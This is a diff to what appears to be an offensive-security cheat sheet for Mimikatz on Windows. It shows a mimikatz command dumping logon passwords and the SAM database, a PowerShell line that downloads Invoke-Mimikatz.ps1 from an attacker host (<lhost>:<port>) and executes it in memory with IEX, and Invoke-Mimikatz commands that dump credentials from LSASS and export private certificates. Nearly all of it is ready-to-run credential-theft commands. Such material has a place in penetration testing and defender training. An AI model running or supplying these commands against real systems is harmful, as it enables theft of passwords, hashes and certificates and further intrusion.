@@ -8,11 +8,25 @@
 mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
 ```
 
-## powershell - load mimikatz
+## PowerShell - load mimikatz from remote
 https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
 ```powershell
-(new-object system.net.webclient).downloadstring('http://<lhost>/Invoke-Mimikatz.ps1') | IEX
-Invoke mimikatz
+(new-object system.net.webclient).downloadstring('http://<lhost>:<port>/Windows/Invoke-Mimikatz.ps1') | IEX
+```
+
+## Invoke-mimikatz - dump credentials out of LSASS
+```
+Invoke-mimikatz -DumpCreds
+```
+
+## Invoke-mimikatz - export all private certificates
+```
+Invoke-mimikatz -DumpCerts
+```
+
+## Invoke-mimikatz - execute mimikatz command
+```
+Invoke-mimikatz -Command "<command|privilege::debug sekurlsa::logonpasswords>"
 ```
 
 ## mimikatz disable PPL and dump passwords
